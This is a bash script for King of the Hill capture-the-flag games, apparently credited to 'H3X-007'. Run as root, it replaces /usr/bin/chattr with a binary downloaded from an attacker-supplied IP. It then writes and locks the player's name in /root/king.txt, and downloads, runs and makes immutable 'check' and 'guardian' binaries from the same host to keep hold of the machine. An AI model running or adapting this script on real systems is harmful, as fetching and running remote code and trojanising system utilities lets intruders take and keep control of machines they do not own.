#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

if [[ $(id -u) -ne 0 ]]; then
    echo -e "${RED}Insufficient privileges. Please run this script as the root user or with sudo.${RESET}" >&2
    exit 1
else
    echo -e "${GREEN}You have root privileges. Continuing with the script...${RESET}"
fi

echo -e "${GREEN}Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :)${RESET}"
echo
echo -e "Join our Discord Server: ${YELLOW}https://discord.gg/568RgwjZYk${RESET}"
echo
echo "-----------------------------------------------------------------------------"

IP="$1"
nick="$2"
sudo chmod 0755 /usr/bin/pkexec
rm -rf /usr/bin/chattr
cd /usr/bin && wget http://$IP/realchattr && mv realchattr chattr && chmod +x chattr
set write off
sudo chattr -ai /root/king.txt
echo "$nick" > /root/king.txt
sudo chmod 400 /root/king.txt
sudo chattr +ai /root/king.txt
set -o noclobber /root/king.txt
sudo mount --bind -o ro /root/king.txt /root/king.txt

cd /usr/bin && wget http://$IP/check && chmod +x check
./check "$IP" "$nick" &
cd /usr/bin && wget http://$IP/guardian && chmod +x guardian
./guardian "$IP" &

chattr +ai /usr/bin/check
chattr +ai /usr/bin/guardian

cd /usr/bin && mv chattr put
cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
cd /usr/bin && put +ai chattr

echo -e "${GREEN}Operation Fully Complete. The KING is $nick! :)${RESET}"
echo
echo -e "${BLUE}-------------- Hi $nick, don't forget to give us a star on GitHub --------------${RESET}"
echo -e "${BLUE}--------------------------------------------------------------------------------${RESET}"
